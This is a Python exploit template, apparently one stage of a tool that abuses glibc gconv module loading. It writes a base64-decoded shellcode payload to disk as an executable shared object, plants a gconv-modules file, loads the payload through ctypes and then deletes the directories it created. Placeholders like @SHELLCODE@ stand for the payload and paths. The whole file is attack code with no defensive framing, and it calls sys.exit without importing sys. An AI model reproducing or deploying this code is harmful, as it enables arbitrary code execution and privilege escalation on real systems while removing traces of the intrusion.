"""@SHELLCODE@"""

from shutil import rmtree
from ctypes import CDLL
from base64 import b64decode

import os


def fwrite(fpath, content=b""):
    try:
        f = open(fpath, "wb")
        f.write(content)
        os.chmod(fpath, 0o755)
    finally:
        f.close()


dirs = ("@GCONV_DIR@", "@SO_DIR@")
try:
    pid = os.fork()
except OSError:
    sys.exit()
if pid == 0:
    for d in dirs:
        try:
            os.mkdir(d, 0o755)
        except (OSError, FileExistsError):
            pass
    fwrite("@SO_PATH@", b64decode(__doc__))
    fwrite("@GCONV_MOD_PATH@", b"@GCONV_MOD_CONTENT@")
    fwrite("@GCONV_DIR@/@SO_NAME@")
    CDLL("@SO_PATH@").so_main()
else:
    os.wait()
    for d in dirs:
        rmtree(d, ignore_errors=True)
